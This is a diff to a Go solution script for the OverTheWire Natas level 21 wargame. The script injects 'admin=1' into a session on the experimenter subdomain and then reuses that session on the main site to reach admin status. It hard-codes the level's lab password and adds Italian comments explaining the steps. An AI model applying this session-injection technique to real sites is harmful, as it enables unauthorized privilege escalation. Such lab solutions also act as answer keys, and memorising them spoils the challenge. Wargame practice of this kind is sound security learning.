@@ -13,7 +13,10 @@ func main() {
 	baseURL := "http://natas21.natas.labs.overthewire.org/"
 	baseURLexpe := "http://natas21-experimenter.natas.labs.overthewire.org"
 
+	//Carico nel subdominio la session key admin
 	result(baseURLexpe)
+
+	//ricarico la sessione del subdominio con la key admin
 	result(baseURL)
 
 }
@@ -24,7 +27,7 @@ func result(url string) bool {
 	usr := "natas21"
 	psw := "IFekPyrQXftziDEsUr3x21sYuahypdgJ"
 
-	query := "?align=left&fontsize=200%&bgcolor=red&admin=1&debug=1"
+	query := "?align=left&fontsize=80%&bgcolor=red&admin=1&debug=1&submit=1"
 
 	client := &http.Client{}
 	req, _ := http.NewRequest("GET",
@@ -39,7 +42,7 @@ func result(url string) bool {
 	buf := new(bytes.Buffer)
 	buf.ReadFrom(res.Body)
 	bs := buf.String()
-	fmt.Println(bs)
+	//fmt.Println(bs)
 
 	if strings.Contains(bs, "You are an admin") {
 		fmt.Println(bs)
